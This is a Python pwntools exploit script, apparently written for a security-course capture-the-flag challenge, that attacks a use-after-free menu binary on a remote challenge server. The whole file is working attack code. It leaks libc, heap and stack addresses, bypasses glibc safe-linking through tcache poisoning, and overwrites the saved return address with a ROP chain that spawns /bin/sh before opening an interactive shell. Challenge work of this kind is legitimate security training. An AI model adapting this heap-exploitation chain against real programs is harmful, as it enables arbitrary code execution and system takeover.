from pwn import *
import time 

def add(size):
  recieved = p.recvuntil(b">").decode('utf-8')
  p.send(b"1" + b"\n")
  recieved = p.recvuntil(b"Size:\n").decode('utf-8')
  p.send(size.encode() + b"\n")
  
def edit(num, payload):
  recieved = p.recvuntil(b">").decode('utf-8')
  p.send(b"3" + b"\n")
  recieved = p.recvuntil(b"edit?\n>").decode('utf-8')
  p.send(num.encode() + b"\n")
  recieved = p.recvuntil(b"Content:\n").decode('utf-8')
  p.send(payload + b"\n")

def delete(num):
  recieved = p.recvuntil(b">").decode('utf-8')
  p.send(b"2" + b"\n")
  recieved = p.recvuntil(b"delete?\n>").decode('utf-8')
  p.send(num.encode() + b"\n")
  
def read(num):
  recieved = p.recvuntil(b">").decode('utf-8')
  p.send(b"4" + b"\n")
  recieved = p.recvuntil(b"read?\n>").decode('utf-8')
  p.send(num.encode() + b"\n")
  

local = False

context.arch = "amd64"
context.os = "linux"
context.bits = 64
context.log_level="DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

if local:
    p = gdb.debug("./uaf", '''
                              set follow-fork-mode child
                              break main
                              continue
                              ''')
else:
    p=remote("offsec-chalbroker.osiris.cyber.nyu.edu", 12349)

e = ELF("./libc.so.6")
r = ROP("./libc.so.6")

add("1033")
edit("0", b"A"*1032)

add("1050")
edit("1", b"B"*1049)

add("32")
edit("2", b"C"*31)

add("32")
edit("3", b"D"*31)

add("32")
edit("4", b"E"*31)

add("32")
edit("5", b"F"*31)

add("64")
edit("6", b"G"*63)

add("64")
edit("7", b"H"*63)

add("32")
edit("8", b"I"*31)

delete("1")
delete("3")
delete("4")

read("1")

recieved = p.recvline()
recieved = p.recvline()
leaked = recieved[:8]
recieved = p.recvline()
recieved = p.recvline()
leaked_addr = ""
for byte in leaked:
  leaked_addr = format(byte, '02x') + leaked_addr
leaked_addr = "0x" + leaked_addr
print(leaked_addr)
decimal_leaked_addr = int(leaked_addr, 16)
print(hex(decimal_leaked_addr))

glibc_base = decimal_leaked_addr - 2206944
print("GLIBC BASE: " + str(hex(glibc_base)))

add("1050")

read("3")

recieved = p.recvline()
recieved = p.recvline()
print(recieved)
heap_leaked = recieved[:8]
recieved = p.recvline()
recieved = p.recvline()

heap_leaked_addr = ""
for byte in heap_leaked:
  heap_leaked_addr = format(byte, '02x') + heap_leaked_addr
heap_leaked_addr = "0x" + heap_leaked_addr
print(heap_leaked_addr)
heap_front = int(heap_leaked_addr, 16) << 12

environ_addr = glibc_base + e.symbols["environ"]
print("environ addr: " + str(hex(environ_addr)))

target_chunk = heap_front+0xb50
print("target")
print(hex(target_chunk))
payload = ((target_chunk >> 12) ^ environ_addr).to_bytes(8, "little")
edit("4", payload)

add("32")
add("32")
read("11")

recieved = p.recvline()
recieved = p.recvline()
print(recieved)
stack_leaked = recieved[:8]
recieved = p.recvline()
recieved = p.recvline()
stack_leaked_addr = ""
for byte in stack_leaked:
  stack_leaked_addr = format(byte, '02x') + stack_leaked_addr
stack_leaked_addr = "0x" + stack_leaked_addr
print(stack_leaked_addr)
stack = int(stack_leaked_addr, 16)

main_pushed_rip = stack - 0x128
print(hex(main_pushed_rip))

delete("6")
delete("7")

target_chunk = heap_front+0xbe0
payload = ((target_chunk >> 12) ^ main_pushed_rip).to_bytes(8, "little")
edit("7", payload)

payload = [
    (0x1).to_bytes(8, "little"),
    (glibc_base + r.rdi.address).to_bytes(8, "little"),
    (glibc_base + next(e.search(b'/bin/sh'))).to_bytes(8, "little"),
    (glibc_base + r.rax.address).to_bytes(8, "little"),
    (0x3b).to_bytes(8, "little"),
    (glibc_base + r.rsi.address).to_bytes(8, "little"),
    (0).to_bytes(8, "little"),
    (glibc_base + r.syscall.address).to_bytes(8, "little")
]

add("64")
add("64")
edit("13", b"".join(payload))

recieved = p.recvuntil(b">").decode('utf-8')
p.send(b"5" + b"\n")

p.interactive()
